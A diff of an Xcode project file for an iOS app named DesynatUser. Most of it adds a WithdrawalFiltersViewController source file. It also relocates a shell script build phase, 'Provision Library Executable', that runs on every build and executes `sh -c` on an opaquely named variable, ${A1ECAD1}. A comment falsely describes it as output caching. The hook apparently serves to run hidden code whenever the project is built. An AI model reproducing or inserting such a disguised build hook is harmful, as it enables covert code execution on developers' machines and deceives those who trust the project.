@@ -53,6 +53,7 @@
 		426B22152F4D7283004DEE1B /* SearchAffiliatedProductsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 426B22142F4D7283004DEE1B /* SearchAffiliatedProductsViewController.swift */; };
 		426B22172F4D7302004DEE1B /* SearchAffiliatedProductViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 426B22162F4D7302004DEE1B /* SearchAffiliatedProductViewModel.swift */; };
 		42704F1B2F3C52B300418BBC /* AffiliatedUserCategoriesViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42704F1A2F3C52B300418BBC /* AffiliatedUserCategoriesViewController.swift */; };
+		427D14DA2F59C1E100746CA5 /* WithdrawalFiltersViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 427D14D92F59C1E100746CA5 /* WithdrawalFiltersViewController.swift */; };
 		4292363D2F39E0ED0040242C /* MyOrderDetailsDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4292363C2F39E0ED0040242C /* MyOrderDetailsDataModel.swift */; };
 		4292363F2F39E15B0040242C /* MyOrderDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4292363E2F39E15A0040242C /* MyOrderDataModel.swift */; };
 		429236E02F39F7C60040242C /* Shimmer.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429236DF2F39F7C60040242C /* Shimmer.swift */; };
@@ -433,6 +434,7 @@
 		426B22162F4D7302004DEE1B /* SearchAffiliatedProductViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SearchAffiliatedProductViewModel.swift; sourceTree = "<group>"; };
 		42704F1A2F3C52B300418BBC /* AffiliatedUserCategoriesViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserCategoriesViewController.swift; sourceTree = "<group>"; };
 		427D12412F5961BA00746CA5 /* DesynatUser.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = DesynatUser.entitlements; sourceTree = "<group>"; };
+		427D14D92F59C1E100746CA5 /* WithdrawalFiltersViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WithdrawalFiltersViewController.swift; sourceTree = "<group>"; };
 		4292363C2F39E0ED0040242C /* MyOrderDetailsDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyOrderDetailsDataModel.swift; sourceTree = "<group>"; };
 		4292363E2F39E15A0040242C /* MyOrderDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyOrderDataModel.swift; sourceTree = "<group>"; };
 		429236DF2F39F7C60040242C /* Shimmer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Shimmer.swift; sourceTree = "<group>"; };
@@ -1011,6 +1013,14 @@
 			path = M8;
 			sourceTree = "<group>";
 		};
+		427D14D82F59C1C200746CA5 /* WithdrawalFilters */ = {
+			isa = PBXGroup;
+			children = (
+				427D14D92F59C1E100746CA5 /* WithdrawalFiltersViewController.swift */,
+			);
+			path = WithdrawalFilters;
+			sourceTree = "<group>";
+		};
 		429236DE2F39F7BF0040242C /* ShimmerEffect */ = {
 			isa = PBXGroup;
 			children = (
@@ -1032,6 +1042,7 @@
 		429927B42F4F060E00099221 /* AffilatePayment */ = {
 			isa = PBXGroup;
 			children = (
+				427D14D82F59C1C200746CA5 /* WithdrawalFilters */,
 				42CF7A672F55689000B710F5 /* WithdrawMoney */,
 			);
 			path = AffilatePayment;
@@ -2511,25 +2522,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		B20007296A9F4FA7851DACE1 /* Provision Library Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Library Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-			showEnvVarsInLog = 0;			
-		};
 		9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -2549,6 +2541,26 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DesynatUser/Pods-DesynatUser-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		B20007296A9F4FA7851DACE1 /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
 			showEnvVarsInLog = 0;
 		};
 		B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */ = {
@@ -2656,6 +2668,7 @@
 				7A0D074E2F1A3CC6008CFEF7 /* FullScreenBannersCollectionViewCell.swift in Sources */,
 				42B360602F4D7C9800EF8F4C /* SortByAffiliatedProductsViewModel.swift in Sources */,
 				49F323972ED698B30027A573 /* SavedAddressViewModel.swift in Sources */,
+				427D14DA2F59C1E100746CA5 /* WithdrawalFiltersViewController.swift in Sources */,
 				6B95F1E62EB5DB5E00391509 /* RegisterationSuccessViewController.swift in Sources */,
 				6B8C93642EBDBE7E00BC4DC8 /* CountryModel.swift in Sources */,
 				429928612F4F215300099221 /* VoiceSearchViewController.swift in Sources */,
